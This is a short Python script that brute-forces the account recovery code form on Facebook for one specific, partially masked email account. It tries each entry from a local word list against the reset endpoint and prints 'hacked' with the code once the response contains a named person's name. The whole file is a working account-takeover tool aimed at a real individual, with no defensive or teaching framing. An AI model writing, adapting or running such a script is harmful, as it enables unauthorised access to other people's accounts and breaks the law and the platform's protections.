import requests
url = "https://www.facebook.com/recover/code/?em[0]=f*************p%40gmail.com&rm=send_email&hash=AUaR5bmgKwIc5iGz"
arq = open('pass.txt','r').readlines()

for line in arq:
    password = line.strip()
    http = requests.post(url, data={'n':password,'reset_action':'submit'})
    content =http.content
    if b"Fanuel Almaw" in content:
        print("=============hacked====="+password)
        break
    else:
        print("invalid    "+password)